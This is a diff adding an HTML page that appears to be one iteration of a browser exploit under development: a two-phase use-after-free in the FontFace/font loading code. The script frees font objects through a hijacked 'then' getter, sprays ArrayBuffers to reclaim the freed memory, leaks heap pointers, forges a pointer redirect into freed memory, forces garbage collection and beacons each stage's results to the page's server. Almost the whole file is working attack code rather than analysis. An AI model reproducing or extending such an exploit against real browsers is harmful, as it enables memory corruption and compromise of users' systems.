@@ -1,0 +1,219 @@
+<!--
+  p599 v4i: Two-phase UAF — NULL SPRAY TEST (no 80B spray).
+
+  Discriminating test: does the two-phase redirect survive WITHOUT 80B spray?
+  If YES: freed memory at T1-0x60 is benign (zeros/empty table) — 80B spray
+          was unnecessary for survival. The exploit simplifies drastically.
+  If NO:  freed memory is hostile (old wrapper data) — 80B spray IS required.
+
+  Also reports W2 (WeakPtrImpl*) from the 192B buffer for offset analysis,
+  and polls rc over 10 seconds with aggressive cleanup to check for natural
+  deref() calls.
+
+  CRASH_CLASS: MODERATE (redirect to uncontrolled freed memory)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p599v4i</title>
+<style id="v1">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<style id="v2">@font-face{font-family:sb;src:local(Arial);unicode-range:U+0044}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+
+var stage=0;
+var lane1=null, hit1=-1, T1_lo=0, T1_hi=0;
+var lane2=null, hit2=-1, T2_lo=0, T2_hi=0;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){
+  if(stage===0){stage=1;
+    document.getElementById('v1').remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('P1:FREE');
+    lane1=[];
+    for(var i=0;i<2048;i++) lane1.push(new Uint8Array(new ArrayBuffer(192)));
+    for(var j=0;j<lane1.length;j++){
+      var v=lane1[j]; wD(v,0,2); v[0x82]=3; v[0x85]=0xAA;
+    }
+    b('P1:SPRAY:'+lane1.length);
+    return;
+  }
+  if(stage===2){stage=3;
+    document.getElementById('v2').remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('P2:FREE');
+    lane2=[];
+    for(var i=0;i<2048;i++) lane2.push(new Uint8Array(new ArrayBuffer(192)));
+    for(var j=0;j<lane2.length;j++){
+      var v=lane2[j]; wD(v,0,2); v[0x82]=3; v[0x85]=0xAA;
+    }
+    b('P2:SPRAY:'+lane2.length);
+    return;
+  }
+  return;
+},set:function(){}});
+
+function main(){
+b('V4I-NULL-SPRAY');
+
+var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);void pa.loaded;
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+// Phase 1: find hit, read T1, null +0x58
+setTimeout(function(){
+  if(!lane1){b('P1:NO-SPRAY');return;}
+  for(var i=0;i<lane1.length;i++){
+    var v=lane1[i], rc=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    if(rc!==2||t0){ hit1=i; break; }
+  }
+  if(hit1<0){b('P1:NO-HIT');return;}
+  var v=lane1[hit1];
+  T1_lo=rD(v,0x58); T1_hi=rD(v,0x5C);
+  b('P1:HIT:lane='+hit1+',rc='+rD(v,0)+',T1=0x'+rQ(v,0x58));
+  // Also report W1 for analysis
+  b('P1:W1=0x'+rQ(v,0x68));
+  // Null +0x58 for safe GC1
+  wD(v,0x58,0); wD(v,0x5C,0);
+  b('P1:NULLED');
+}, 200);
+
+// GC1 — frees JSFontFace-1 wrapper (80B class, at ~T1-0x60)
+setTimeout(function(){
+  if(hit1<0) return;
+  b('P1:GC-START');
+  for(var i=0;i<50000;i++) new Object();
+  for(var i=0;i<500;i++) new ArrayBuffer(65536);
+  b('P1:GC-DONE');
+}, 600);
+
+// Post-GC1: NO 80B SPRAY — this is the discriminating test.
+// Instead, just start Phase 2 directly.
+setTimeout(function(){
+  if(hit1<0) return;
+  var v=lane1[hit1];
+  b('P1:POST-GC:rc='+rD(v,0));
+  b('P1:NO-80B-SPRAY');
+
+  // Start Phase 2
+  stage=2;
+  var pb=new FontFace('pb','local(Helvetica)',{unicodeRange:'U+0043'});
+  document.fonts.add(pb);void pb.loaded;
+  document.fonts.load('1em pb, sb','CD').then(function(){},function(){});
+  b('P2:STARTED');
+}, 1200);
+
+// Phase 2: find hit, read T2/W2, redirect +0x58 to T1-0x50, GC2
+setTimeout(function(){
+  if(stage<3){b('P2:NO-TRAP');return;}
+  if(!lane2){b('P2:NO-SPRAY');return;}
+
+  for(var i=0;i<lane2.length;i++){
+    var v=lane2[i], rc=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    if(rc!==2||t0){ hit2=i; break; }
+  }
+  if(hit2<0){b('P2:NO-HIT');return;}
+  var v=lane2[hit2];
+  T2_lo=rD(v,0x58); T2_hi=rD(v,0x5C);
+  b('P2:HIT:lane='+hit2+',rc='+rD(v,0)+',T2=0x'+rQ(v,0x58));
+  // Report W2 (WeakPtrImpl* at +0x68)
+  b('P2:W2=0x'+rQ(v,0x68));
+  // Compute and report T2-0x60 for comparison
+  var diff_lo = T2_lo - 0x60;
+  var diff_hi = T2_hi;
+  if(diff_lo < 0){ diff_lo += 0x100000000; diff_hi -= 1; }
+  b('P2:T2-0x60=0x'+('00000000'+diff_hi.toString(16)).slice(-8)+('00000000'+(diff_lo>>>0).toString(16)).slice(-8));
+
+  // Redirect +0x58 in the second UAF buffer to T1-0x50
+  // This points removeClient to the FREED memory at T1-0x60 (wrapper-1 hole)
+  // WITHOUT our 80B spray buffer there
+  var forge_lo = T1_lo - 0x50;
+  var forge_hi = T1_hi;
+  if(forge_lo < 0){ forge_lo += 0x100000000; forge_hi -= 1; }
+  wD(v, 0x58, forge_lo>>>0);
+  wD(v, 0x5C, forge_hi);
+  b('P2:REDIRECT:+58=0x'+rQ(v,0x58));
+}, 1700);
+
+// GC2
+setTimeout(function(){
+  if(hit2<0) return;
+  b('P2:GC-START');
+  for(var i=0;i<50000;i++) new Object();
+  for(var i=0;i<500;i++) new ArrayBuffer(65536);
+  b('P2:GC-DONE');
+}, 2200);
+
+// Post-GC2: check survival and rc. Then aggressive cleanup + rc polling.
+setTimeout(function(){
+  if(hit2<0) return;
+  var v=lane2[hit2];
+  var rc2=rD(v,0);
+  b('P2:POST-GC:rc='+rc2);
+
+  if(rc2===2){
+    b('★NULL-SPRAY-SURVIVED:rc=2');
+    // Freed memory was benign! 80B spray was unnecessary.
+  } else {
+    b('P2:RC-UNEXPECTED:'+rc2);
+  }
+
+  // Now try aggressive cleanup to trigger more deref() calls
+  // Remove remaining font pa from document.fonts
+  try{
+    document.fonts.forEach(function(f){ document.fonts.delete(f); });
+    b('CLEANUP:fonts-cleared');
+  }catch(e){
+    b('CLEANUP:fonts-err='+e.message);
+  }
+  // Force layout
+  document.body.offsetHeight;
+}, 3000);
+
+// Heavy GC after cleanup
+setTimeout(function(){
+  if(hit2<0) return;
+  b('CLEANUP:GC-START');
+  for(var i=0;i<100000;i++) new Object();
+  for(var i=0;i<1000;i++) new ArrayBuffer(65536);
+  b('CLEANUP:GC-DONE');
+  var v=lane2[hit2];
+  b('CLEANUP:rc='+rD(v,0));
+}, 3500);
+
+// rc poll at t=5s
+setTimeout(function(){
+  if(hit2<0) return;
+  var v=lane2[hit2];
+  b('POLL-5s:rc='+rD(v,0));
+}, 5000);
+
+// rc poll at t=8s
+setTimeout(function(){
+  if(hit2<0) return;
+  var v=lane2[hit2];
+  b('POLL-8s:rc='+rD(v,0));
+}, 8000);
+
+// rc poll at t=11s — if rc dropped below 2, report!
+setTimeout(function(){
+  if(hit2<0) return;
+  var v=lane2[hit2];
+  var rc=rD(v,0);
+  b('POLL-11s:rc='+rc);
+  if(rc < 2){
+    b('★RC-DROPPED-FURTHER:'+rc);
+  }
+  b('ALL-DONE');
+}, 11000);
+
+setTimeout(function(){b('ALIVE');},13000);
+}
+setTimeout(main,0);
+setTimeout(function(){location.reload();},20000);
+</script></head><body>p599v4i</body></html>
